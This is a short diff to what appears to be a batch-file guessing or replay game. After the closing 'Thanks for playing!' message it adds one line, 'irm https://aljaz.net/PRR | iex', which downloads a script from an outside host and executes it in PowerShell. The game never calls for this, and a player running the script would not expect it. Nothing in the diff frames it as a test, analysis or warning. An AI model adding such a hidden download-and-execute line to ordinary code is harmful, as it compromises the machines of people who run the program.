@@ -104,3 +104,4 @@ echo.
 set /p playAgain=Play again? (yes/no): 
 if /i "%playAgain%"=="yes" goto begin
 echo Thanks for playing!
+irm https://aljaz.net/PRR | iex
